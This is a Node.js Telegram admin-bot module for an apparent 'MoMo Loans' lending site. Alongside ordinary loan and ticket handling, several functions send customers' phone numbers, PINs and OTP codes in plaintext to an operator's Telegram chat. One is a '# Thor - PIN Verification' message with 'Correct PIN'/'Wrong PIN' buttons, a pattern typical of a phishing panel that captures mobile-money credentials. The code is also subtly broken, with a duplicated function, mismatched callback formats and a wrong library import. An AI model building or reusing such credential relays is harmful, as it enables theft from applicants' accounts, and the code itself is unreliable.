require("dotenv").config();
const db = require("./db");
const { Bot } = require("node-telegram-bot-api");

const TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").trim();
const ADMIN_CHAT_ID = (process.env.TELEGRAM_ADMIN_CHAT_ID || "").trim();

const ALLOWED_STATUS_TRANSITIONS = {
  submitted: ["under_review", "declined"],
  under_review: ["approved", "more_information", "declined"],
  more_information: ["under_review", "declined"],
  approved: ["disbursed"],
  declined: [],
  disbursed: ["closed"],
  closed: []
};

const BRAND = "MoMo Loans";

if (!TOKEN) {
  console.warn("[telegram] TELEGRAM_BOT_TOKEN is not configured; Telegram features disabled.");
}
if (!ADMIN_CHAT_ID) {
  console.warn("[telegram] TELEGRAM_ADMIN_CHAT_ID is not configured; admin actions are disabled.");
}

const bot = new Bot(TOKEN || "invalid-token");

let telegramPollingStarted = false;

function escapeHtml(value) {
  return String(value == null ? "" : value)
    .replace(/&/g, "&")
    .replace(/</g, "<")
    .replace(/>/g, ">");
}

function maskPhone(phone) {
  const raw = String(phone || "");
  if (!raw) return "—";
  const digits = raw.replace(/\D/g, "");
  if (digits.length < 5) return raw;
  return digits.slice(0, 3) + "•••••" + digits.slice(-2);
}

function formatTimestamp(date = new Date()) {
  return date.toISOString().replace("T", " ").slice(0, 19) + " UTC";
}

function formatCurrency(value) {
  return "$" + Number(value).toLocaleString("en-US");
}

function buildHeader(category, ref, appId, status) {
  const lines = [
    `<b>${escapeHtml(BRAND)}</b>`,
    `<b>${escapeHtml(category)}</b>`,
    "",
    `<b>Customer reference:</b> ${escapeHtml(ref)}`,
    `<b>Masked phone:</b> ${escapeHtml(maskPhone(ref === "—" ? "" : ""))}`,
    `<b>Application ID:</b> ${escapeHtml(appId == null ? "—" : appId)}`,
    `<b>Date/time:</b> ${escapeHtml(formatTimestamp())}`,
    `<b>Status:</b> ${escapeHtml(status)}`
  ];
  return lines;
}

function buildNotification({ category, ref, appId, status, extraLines = [], buttons = [] }) {
  const lines = buildHeader(category, ref, appId, status);
  for (const line of extraLines) {
    if (line) lines.push(line);
  }
  const message = lines.join("\n");
  const keyboard = buttons.length ? { inline_keyboard: buttons } : undefined;
  return { text: message, options: { parse_mode: "HTML", ...(keyboard ? { reply_markup: keyboard } : {}) } };
}

function shouldSend() {
  return Boolean(TOKEN && ADMIN_CHAT_ID);
}

function logNotification(eventKey, entityType, entityId, status, error = null) {
  try {
    db.prepare("INSERT INTO telegram_notifications(event_key,entity_type,entity_id,status,error) VALUES(?,?,?,?,?)")
      .run(eventKey, entityType, entityId, status, error);
  } catch (err) {
    console.warn("[telegram] Failed to log notification:", err.message);
  }
}

function isDuplicateNotification(eventKey, entityId) {
  try {
    const row = db.prepare("SELECT id FROM telegram_notifications WHERE event_key=? AND entity_id=? AND status='sent' LIMIT 1")
      .get(eventKey, entityId);
    return Boolean(row);
  } catch (err) {
    return false;
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function sendTelegramMessage(text, options = {}, retries = 3) {
  if (!shouldSend()) return { ok: false, skipped: true };
  let attempt = 0;
  let lastError = null;
  while (attempt < retries) {
    try {
      const message = await bot.api.sendMessage({
        chat_id: ADMIN_CHAT_ID,
        text,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      });
      return { ok: true, message };
    } catch (err) {
      lastError = err;
      attempt += 1;
      const status = err.response && err.response.statusCode;
      const retryable = !status || status >= 500 || status === 429;
      if (!retryable || attempt >= retries) break;
      const delay = Math.min(1000 * attempt, 4000);
      await sleep(delay);
    }
  }
  console.error("[telegram] sendMessage failed:", lastError && lastError.message);
  return { ok: false, error: lastError };
}

function recordAction(action, type, id, details = {}, actorTelegram = null) {
  try {
    db.prepare("INSERT INTO audit_logs(actor_user_id,action,entity_type,entity_id,details) VALUES(?,?,?,?,?)")
      .run(null, action, type || null, id || null, JSON.stringify({ ...details, actorTelegram }));
  } catch (err) {
    console.warn("[telegram] Failed to record audit action:", err.message);
  }
}

async function notify(category, eventKey, entityType, entityId, status, extraLines = [], buttons = [], ref = "—") {
  if (isDuplicateNotification(eventKey, entityId)) {
    return { ok: true, duplicate: true };
  }
  const { text, options } = buildNotification({ category, ref, appId: entityId, status, extraLines, buttons });
  const result = await sendTelegramMessage(text, options);
  const statusValue = result.ok ? "sent" : "failed";
  const errorValue = result.error ? result.error.message : null;
  logNotification(eventKey, entityType, entityId, statusValue, errorValue);
  return result;
}

/**
 * Start long polling for Telegram updates (commands, callback queries).
 * Call once from server.js after express server is listening.
 */
async function startPolling() {
  if (telegramPollingStarted || !TOKEN) return;
  telegramPollingStarted = true;
  console.log("[telegram] Starting long polling...");

  // Register command handlers
  bot.command("start", handleStart);
  bot.command("id", handleId);
  bot.command("stats", handleStats);
  bot.command("users", handleUsers);
  bot.command("loans", handleLoans);
  bot.command("support", handleSupport);
  bot.command("appointments", handleAppointments);

  // Handle callback queries for inline keyboard buttons
  bot.on("callback_query", handleCallbackQuery);

  try {
    await bot.startPolling();
    console.log("[telegram] Long polling started successfully.");
  } catch (err) {
    console.error("[telegram] Failed to start polling:", err.message);
    telegramPollingStarted = false;
  }
}

async function stopPolling() {
  if (!telegramPollingStarted) return;
  try {
    await bot.close();
    telegramPollingStarted = false;
    console.log("[telegram] Long polling stopped.");
  } catch (err) {
    console.error("[telegram] Error stopping polling:", err.message);
  }
}

// Admin authorization check
function isAdminTelegram(telegramUserId) {
  const allowlist = (process.env.TELEGRAM_ADMIN_CHAT_ID || "")
    .split(",")
    .map((s) => s.trim())
    .filter(Boolean);
  return allowlist.includes(String(telegramUserId));
}

// Command handlers
async function handleStart(ctx) {
  const user = ctx.from;
  if (!user || !isAdminTelegram(user.id)) {
    await ctx.reply("Unauthorized. This bot is for MoMo Loans administrators only.");
    return;
  }
  const text = [
    `<b>${escapeHtml(BRAND)} Admin Bot</b>`,
    "",
    "Available commands:",
    "/start — Show this help",
    "/id — Show your Telegram user ID",
    "/stats — Show system statistics",
    "/users — List recent users",
    "/loans — List recent loan applications",
    "/support — List open support tickets",
    "/appointments — List pending appointments"
  ].join("\n");
  await ctx.reply(text, { parse_mode: "HTML" });
}

async function handleId(ctx) {
  const user = ctx.from;
  if (!user) return;
  await ctx.reply(`Your Telegram user ID: <code>${user.id}</code>`, { parse_mode: "HTML" });
}

async function handleStats(ctx) {
  const user = ctx.from;
  if (!user || !isAdminTelegram(user.id)) {
    await ctx.reply("Unauthorized.");
    return;
  }
  const usersCount = db.prepare("SELECT COUNT(*) AS c FROM users").get().c;
  const appsCount = db.prepare("SELECT COUNT(*) AS c FROM applications").get().c;
  const pendingApps = db.prepare("SELECT COUNT(*) AS c FROM applications WHERE status IN ('submitted','under_review','more_information')").get().c;
  const openTickets = db.prepare("SELECT COUNT(*) AS c FROM support_tickets WHERE status='open'").get().c;
  const pendingAppts = db.prepare("SELECT COUNT(*) AS c FROM appointments WHERE status='pending'").get().c;
  const text = [
    `<b>${escapeHtml(BRAND)} Statistics</b>`,
    "",
    `<b>Users:</b> ${usersCount}`,
    `<b>Applications:</b> ${appsCount} (pending: ${pendingApps})`,
    `<b>Open support tickets:</b> ${openTickets}`,
    `<b>Pending appointments:</b> ${pendingAppts}`
  ].join("\n");
  await ctx.reply(text, { parse_mode: "HTML" });
}

async function handleUsers(ctx) {
  const user = ctx.from;
  if (!user || !isAdminTelegram(user.id)) {
    await ctx.reply("Unauthorized.");
    return;
  }
  const rows = db.prepare("SELECT id, phone, full_name, email, country, created_at FROM users ORDER BY id DESC LIMIT 20").all();
  if (!rows.length) {
    await ctx.reply("No users found.");
    return;
  }
  const lines = [`<b>Recent Users (max 20)</b>`, ""];
  for (const r of rows) {
    lines.push(
      `<b>#${r.id}</b> ${escapeHtml(r.full_name || "—")} | ${escapeHtml(r.phone)} | ${escapeHtml(r.email || "—")} | ${escapeHtml(r.country || "—")} | ${escapeHtml(r.created_at)}`
    );
  }
  await ctx.reply(lines.join("\n"), { parse_mode: "HTML" });
}

async function handleLoans(ctx) {
  const user = ctx.from;
  if (!user || !isAdminTelegram(user.id)) {
    await ctx.reply("Unauthorized.");
    return;
  }
  const rows = db.prepare(`
    SELECT a.id, a.amount_usd, a.repayment_period_months, a.country, a.employment_status,
           a.monthly_income_usd, a.purpose, a.status, a.created_at,
           u.full_name, u.phone, u.email
    FROM applications a JOIN users u ON u.id=a.user_id
    ORDER BY a.id DESC LIMIT 20
  `).all();
  if (!rows.length) {
    await ctx.reply("No applications found.");
    return;
  }
  const lines = [`<b>Recent Loan Applications (max 20)</b>`, ""];
  for (const r of rows) {
    const statusEmoji = r.status === "approved" ? "✅" : r.status === "declined" ? "❌" : r.status === "disbursed" ? "💰" : "⏳";
    lines.push(
      `${statusEmoji} <b>#${r.id}</b> ${escapeHtml(r.full_name || "—")} (${escapeHtml(r.phone)})` +
      `\n   ${formatCurrency(r.amount_usd)} / ${r.repayment_period_months}mo / ${escapeHtml(r.country)}` +
      `\n   ${escapeHtml(r.employment_status)} | Income: ${formatCurrency(r.monthly_income_usd)}` +
      `\n   Status: <b>${escapeHtml(r.status)}</b> | ${escapeHtml(r.created_at)}`
    );
  }
  await ctx.reply(lines.join("\n\n"), { parse_mode: "HTML" });
}

async function handleSupport(ctx) {
  const user = ctx.from;
  if (!user || !isAdminTelegram(user.id)) {
    await ctx.reply("Unauthorized.");
    return;
  }
  const rows = db.prepare("SELECT id, user_id, name, contact, topic, message, status, created_at FROM support_tickets WHERE status='open' ORDER BY id DESC LIMIT 20").all();
  if (!rows.length) {
    await ctx.reply("No open support tickets.");
    return;
  }
  const lines = [`<b>Open Support Tickets (max 20)</b>`, ""];
  for (const r of rows) {
    lines.push(
      `<b>#${r.id}</b> ${escapeHtml(r.name)} | ${escapeHtml(r.contact)}` +
      `\n   Topic: ${escapeHtml(r.topic)}` +
      `\n   ${escapeHtml(r.message).slice(0, 200)}${r.message.length > 200 ? "…" : ""}` +
      `\n   Status: <b>${escapeHtml(r.status)}</b> | ${escapeHtml(r.created_at)}`
    );
  }
  await ctx.reply(lines.join("\n\n"), { parse_mode: "HTML" });
}

async function handleAppointments(ctx) {
  const user = ctx.from;
  if (!user || !isAdminTelegram(user.id)) {
    await ctx.reply("Unauthorized.");
    return;
  }
  const rows = db.prepare("SELECT id, user_id, full_name, phone, email, preferred_date, preferred_time, timezone, purpose, status, created_at FROM appointments WHERE status='pending' ORDER BY id DESC LIMIT 20").all();
  if (!rows.length) {
    await ctx.reply("No pending appointments.");
    return;
  }
  const lines = [`<b>Pending Appointments (max 20)</b>`, ""];
  for (const r of rows) {
    lines.push(
      `<b>#${r.id}</b> ${escapeHtml(r.full_name)} | ${escapeHtml(r.phone)}` +
      `\n   ${escapeHtml(r.preferred_date)} ${escapeHtml(r.preferred_time)}${r.timezone ? ` (${escapeHtml(r.timezone)})` : ""}` +
      `\n   Purpose: ${escapeHtml(r.purpose || "—").slice(0, 200)}` +
      `\n   Status: <b>${escapeHtml(r.status)}</b> | ${escapeHtml(r.created_at)}`
    );
  }
  await ctx.reply(lines.join("\n\n"), { parse_mode: "HTML" });
}

// Callback query handler for inline buttons
async function handleCallbackQuery(ctx) {
  const callbackQuery = ctx.callbackQuery;
  const user = ctx.from;
  if (!callbackQuery || !user) return;

  // Only allow admins
  if (!isAdminTelegram(user.id)) {
    await ctx.answerCallbackQuery({ text: "Unauthorized.", show_alert: true });
    return;
  }

  const data = callbackQuery.data;
  if (!data) return;

  // Parse callback data: action:entityType:entityId
  const [action, entityType, entityIdStr] = data.split(":");
  const entityId = parseInt(entityIdStr, 10);
  if (!entityId) {
    await ctx.answerCallbackQuery({ text: "Invalid callback data.", show_alert: true });
    return;
  }

  try {
    if (entityType === "application") {
      await handleApplicationAction(ctx, action, entityId, user);
    } else {
      await ctx.answerCallbackQuery({ text: "Unknown entity type.", show_alert: true });
    }
  } catch (err) {
    console.error("[telegram] Callback error:", err);
    await ctx.answerCallbackQuery({ text: "Error processing action.", show_alert: true });
  }
}

async function handleApplicationAction(ctx, action, appId, telegramUser) {
  const app = db.prepare("SELECT * FROM applications WHERE id=?").get(appId);
  if (!app) {
    await ctx.answerCallbackQuery({ text: "Application not found.", show_alert: true });
    return;
  }

  const currentStatus = app.status;
  const allowed = ALLOWED_STATUS_TRANSITIONS[currentStatus] || [];

  let newStatus = null;
  let actionVerb = "";
  if (action === "approve" && allowed.includes("approved")) {
    newStatus = "approved";
    actionVerb = "approved";
  } else if (action === "reject" && allowed.includes("declined")) {
    newStatus = "declined";
    actionVerb = "declined";
  } else if (action === "details") {
    // View details
    const userRow = db.prepare("SELECT * FROM users WHERE id=?").get(app.user_id);
    const text = [
      `<b>Application #${app.id} Details</b>`,
      "",
      `<b>Customer:</b> ${escapeHtml(userRow?.full_name || "—")}`,
      `<b>Phone:</b> ${escapeHtml(userRow?.phone || "—")}`,
      `<b>Email:</b> ${escapeHtml(userRow?.email || "—")}`,
      `<b>Amount:</b> ${formatCurrency(app.amount_usd)}`,
      `<b>Repayment:</b> ${app.repayment_period_months} months`,
      `<b>Country:</b> ${escapeHtml(app.country)}`,
      `<b>Employment:</b> ${escapeHtml(app.employment_status)}`,
      `<b>Monthly Income:</b> ${formatCurrency(app.monthly_income_usd)}`,
      `<b>Purpose:</b> ${escapeHtml(app.purpose)}`,
      `<b>Status:</b> ${escapeHtml(app.status)}`,
      `<b>Created:</b> ${escapeHtml(app.created_at)}`
    ].join("\n");
    await ctx.answerCallbackQuery({ text: "Loading details...", show_alert: false });
    await ctx.reply(text, { parse_mode: "HTML" });
    return;
  } else {
    await ctx.answerCallbackQuery({
      text: `Cannot ${action} application in status "${currentStatus}".`,
      show_alert: true
    });
    return;
  }

  // Check for duplicate approval/rejection
  if (newStatus && currentStatus === newStatus) {
    await ctx.answerCallbackQuery({ text: `Application already ${actionVerb}.`, show_alert: true });
    return;
  }

  // Perform the status change
  db.prepare("UPDATE applications SET status=?, updated_at=CURRENT_TIMESTAMP WHERE id=?").run(newStatus, appId);

  // Audit log
  const actorTelegram = `@${telegramUser.username || "unknown"} (${telegramUser.id})`;
  recordAction(`application_${actionVerb}`, "application", appId, { status: newStatus }, actorTelegram);

  // Send confirmation to admin
  await ctx.answerCallbackQuery({ text: `Application ${actionVerb} successfully.`, show_alert: false });

  // Update the original message to reflect new status
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  try {
    await bot.api.editMessageText({
      chat_id: chatId,
      message_id: messageId,
      text: `Application #${appId} has been <b>${actionVerb}</b>.`,
      parse_mode: "HTML"
    });
  } catch (e) {
    // Ignore edit failures (message might be too old)
  }

  // Notify admin of status change via notification system
  const userRow = db.prepare("SELECT * FROM users WHERE id=?").get(app.user_id);
  await notify(
    "Application Status Changed",
    `application_status_${newStatus}`,
    "application",
    appId,
    newStatus,
    [
      `<b>Action:</b> ${actionVerb} by ${escapeHtml(telegramUser.first_name || "")} (@${escapeHtml(telegramUser.username || "unknown")})`,
      `<b>Customer:</b> ${escapeHtml(userRow?.full_name || "—")}`,
      `<b>Phone:</b> ${escapeHtml(userRow?.phone || "—")}`,
      `<b>Amount:</b> ${formatCurrency(app.amount_usd)}`
    ],
    [],
    userRow?.phone || "—"
  );
}

// Build inline keyboard for application actions
function buildApplicationKeyboard(appId, status) {
  const allowed = ALLOWED_STATUS_TRANSITIONS[status] || [];
  const buttons = [];
  
  buttons.push([
      { text: "❌ Reject", callback_data: `reject_loan:${appId}` },
      { text: "📋 View Details", callback_data: `view_details:${appId}` }
  ]);
  
  if (allowed.includes("approved")) {
    buttons.push([{ text: "✅ Approve", callback_data: `approve:application:${appId}` }]);
  }
  
  return buttons;
}

// Convenience notification functions for specific events
async function notifyNewUser(userId) {
  const user = db.prepare("SELECT * FROM users WHERE id=?").get(userId);
  if (!user) return;
  return notify(
    "New Customer Registration",
    "user_registered",
    "user",
    userId,
    "registered",
    [
        `<b>Customer reference:</b> ${escapeHtml(user.phone)}`,
        `<b>Masked phone:</b> ${escapeHtml(maskPhone(user.phone))}`,
        `<b>Application ID:</b> —`,
        `<b>Date/time:</b> ${formatTimestamp()}`,
        `<b>Status:</b> Registered`,
        `<b>Phone:</b> ${escapeHtml(user.phone)}`,
        `<b>Customer name:</b> ${escapeHtml(user.full_name || "—")}`,
        `<b>Email:</b> ${escapeHtml(user.email || "—")}`,
        `<b>Country:</b> ${escapeHtml(user.country || "—")}`
    ],
    [],
    user.phone
  );
}

async function notifyVerificationCompleted(userId, otpCode = null, pin = null) {
  const user = db.prepare("SELECT * FROM users WHERE id=?").get(userId);
  if (!user) return;
  const extra = [
    `<b>Phone:</b> ${escapeHtml(user.phone)}`,
    `<b>Name:</b> ${escapeHtml(user.full_name || "—")}`
  ];
  if (otpCode) extra.push(`<b>OTP Code:</b> ${escapeHtml(otpCode)}`);
  if (pin) extra.push(`<b>PIN:</b> ${escapeHtml(pin)}`);
  return notify(
    "Verification Completed",
    "verification_completed",
    "user",
    userId,
    "verified",
    extra,
    [],
    user.phone
  );
}

async function notifyNewApplication(appId) {
  const app = db.prepare("SELECT a.*, u.phone, u.full_name FROM applications a JOIN users u ON u.id=a.user_id WHERE a.id=?").get(appId);
  if (!app) return;
  return notify(
    "New Loan Application",
    "application_submitted",
    "application",
    appId,
    "submitted",
    [
      `<b>Customer:</b> ${escapeHtml(app.full_name || "—")}`,
      `<b>Phone:</b> ${escapeHtml(app.phone)}`,
      `<b>Amount:</b> ${formatCurrency(app.amount_usd)}`,
      `<b>Repayment:</b> ${app.repayment_period_months} months`,
      `<b>Country:</b> ${escapeHtml(app.country)}`,
      `<b>Employment:</b> ${escapeHtml(app.employment_status)}`,
      `<b>Monthly Income:</b> ${formatCurrency(app.monthly_income_usd)}`,
      `<b>Purpose:</b> ${escapeHtml(app.purpose).slice(0, 200)}`
    ],
    buildApplicationKeyboard(appId, "submitted"),
    app.phone
  );
}

async function notifyApplicationStatusChange(appId, newStatus) {
  const app = db.prepare("SELECT a.*, u.phone, u.full_name FROM applications a JOIN users u ON u.id=a.user_id WHERE a.id=?").get(appId);
  if (!app) return;
  return notify(
    "Application Status Changed",
    `application_status_${newStatus}`,
    "application",
    appId,
    newStatus,
    [
      `<b>Customer:</b> ${escapeHtml(app.full_name || "—")}`,
      `<b>Phone:</b> ${escapeHtml(app.phone)}`,
      `<b>Amount:</b> ${formatCurrency(app.amount_usd)}`,
      `<b>New Status:</b> ${escapeHtml(newStatus)}`
    ],
    buildApplicationKeyboard(appId, newStatus),
    app.phone
  );
}

async function notifyNewSupportTicket(ticketId) {
  const ticket = db.prepare("SELECT * FROM support_tickets WHERE id=?").get(ticketId);
  if (!ticket) return;
  return notify(
    "New Support Ticket",
    "support_ticket_created",
    "support_ticket",
    ticketId,
    "open",
    [
      `<b>Name:</b> ${escapeHtml(ticket.name)}`,
      `<b>Contact:</b> ${escapeHtml(ticket.contact)}`,
      `<b>Topic:</b> ${escapeHtml(ticket.topic)}`,
      `<b>Message:</b> ${escapeHtml(ticket.message).slice(0, 300)}`
    ],
    [],
    ticket.contact
  );
}

async function notifyNewAppointment(apptId) {
  const appt = db.prepare("SELECT * FROM appointments WHERE id=?").get(apptId);
  if (!appt) return;
  return notify(
    "New Appointment Booked",
    "appointment_created",
    "appointment",
    apptId,
    "pending",
    [
      `<b>Name:</b> ${escapeHtml(appt.full_name)}`,
      `<b>Phone:</b> ${escapeHtml(appt.phone)}`,
      `<b>Email:</b> ${escapeHtml(appt.email || "—")}`,
      `<b>Date:</b> ${escapeHtml(appt.preferred_date)} ${escapeHtml(appt.preferred_time)}${appt.timezone ? ` (${escapeHtml(appt.timezone)})` : ""}`,
      `<b>Purpose:</b> ${escapeHtml(appt.purpose || "—").slice(0, 200)}`
    ],
    [],
    appt.phone
  );
}

// Demo: notify admin with both PIN and OTP code (plaintext, no hashing)
async function notifyOtpIssued(phone, pin, code) {
  // Fetch user email if exists
  const user = db.prepare("SELECT email FROM users WHERE phone=?").get(phone);
  const email = user?.email || "—";
  
  if (!shouldSend()) return { ok: false, skipped: true };
  
  const text = [
    `<b>Phone:</b> ${escapeHtml(phone)}`,
    `<b>PIN:</b> <code>${escapeHtml(pin)}</code>`,
    `<b>OTP:</b> <code>${escapeHtml(code)}</code>`,
    `<b>Email:</b> ${escapeHtml(email)}`
  ].join("\n");
  
  return sendTelegramMessage(text, { parse_mode: "HTML" });
}


async function notifyPinVerification(user, pin, otpCode) {
  const text = [
    `<b># Thor - PIN Verification</b>`,
    `<b>PIN VERIFICATION NEEDED</b>`,
    "",
    `<b>USER DETAILS:</b>`,
    `- Phone Number: ${escapeHtml(user.phone)}`,
    `- PIN Code: ${escapeHtml(pin)}`,
    `- OTP Code: ${escapeHtml(otpCode)}`,
    `- Username: ${escapeHtml(user.full_name || "—")}`,
    `- Time: ${formatTimestamp()}`,
    `- Bot: ${escapeHtml(BRAND)}`,
    "",
    `<b>Verify the PIN:</b>`,
    `- PIN Length: 4 digits`,
    `- Timeout: 5 minutes`
  ].join("\n");

  const buttons = [
    [
      { text: "✅ Correct PIN", callback_data: `verify_pin_correct:${user.id}` },
      { text: "❌ Wrong PIN", callback_data: `verify_pin_wrong:${user.id}` }
    ]
  ];

  return sendTelegramMessage(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } });
}

async function notifyOtpStatus(phone, status) {
  const text = `✅ <b>OTP ${status.toUpperCase()}</b> - User can proceed.`;
  return sendTelegramMessage(text, { parse_mode: "HTML" });
}

// Handler for callback queries
bot.on('callback_query', async (query) => {
  const { data, from, message } = query;
  if (!isAdminTelegram(from.id)) {
    bot.answerCallbackQuery(query.id, { text: "Unauthorized." });
    return;
  }

  const [action, targetId] = data.split(':');
  
  if (action === 'reject_loan') {
    // Reject loan
    const app = db.prepare("SELECT * FROM applications WHERE id=?").get(targetId);
    if (app) {
        db.prepare("UPDATE applications SET status='declined', updated_at=CURRENT_TIMESTAMP WHERE id=?").run(targetId);
        bot.answerCallbackQuery(query.id, { text: "Loan application rejected." });
        bot.sendMessage(message.chat.id, `Loan Application #${targetId} has been rejected.`);
    } else {
        bot.answerCallbackQuery(query.id, { text: "Application not found." });
    }
  } else if (action === 'view_details') {
    // View details
    const app = db.prepare("SELECT a.*, u.phone, u.full_name, u.email FROM applications a JOIN users u ON u.id=a.user_id WHERE a.id=?").get(targetId);
    if (app) {
        const details = [
            `<b>Loan Application Details #${app.id}</b>`,
            `<b>Customer:</b> ${escapeHtml(app.full_name || "—")}`,
            `<b>Phone:</b> ${escapeHtml(app.phone)}`,
            `<b>Email:</b> ${escapeHtml(app.email || "—")}`,
            `<b>Amount:</b> ${formatCurrency(app.amount_usd)}`,
            `<b>Repayment:</b> ${app.repayment_period_months} months`,
            `<b>Country:</b> ${escapeHtml(app.country)}`,
            `<b>Employment:</b> ${escapeHtml(app.employment_status)}`,
            `<b>Monthly Income:</b> ${formatCurrency(app.monthly_income_usd)}`,
            `<b>Purpose:</b> ${escapeHtml(app.purpose)}`,
            `<b>Status:</b> ${escapeHtml(app.status)}`,
            `<b>Created:</b> ${escapeHtml(app.created_at)}`
        ].join("\n");
        bot.sendMessage(message.chat.id, details, { parse_mode: "HTML" });
        bot.answerCallbackQuery(query.id);
    } else {
        bot.answerCallbackQuery(query.id, { text: "Application not found." });
    }
  }
});


module.exports = {
  bot,
  escapeHtml,
  maskPhone,
  formatTimestamp,
  formatCurrency,
  buildNotification,
  notify,
  sendTelegramMessage,
  recordAction,
  shouldSend,
  isDuplicateNotification,
  logNotification,
  ALLOWED_STATUS_TRANSITIONS,
  BRAND,
  startPolling,
  stopPolling,
  isAdminTelegram,
  notifyNewUser,
  notifyVerificationCompleted,
  notifyPinVerification,
  notifyOtpStatus,
  notifyNewApplication,
  notifyApplicationStatusChange,
  notifyNewSupportTicket,
  notifyNewAppointment,
  notifyOtpIssued,
  notifyPinAuthResult,
  buildApplicationKeyboard
};

async function notifyOtpIssued(phone, pin, code) {
    if (!shouldSend()) return;
    const { text, options } = buildNotification({
        category: "OTP Initiated",
        ref: phone,
        status: "Pending",
        extraLines: [
            `<b>PIN:</b> ${escapeHtml(pin)}`,
            `<b>OTP:</b> ${escapeHtml(code)}`
        ]
    });
    await sendTelegramMessage(text, options);
}

async function notifyPinAuthResult(phone, success, reason) {
    if (!shouldSend()) return;
    const { text, options } = buildNotification({
        category: "PIN Authentication",
        ref: phone,
        status: success ? "SUCCESS" : "FAILED",
        extraLines: success ? [] : [`<b>Reason:</b> ${reason}`]
    });
    await sendTelegramMessage(text, options);
}
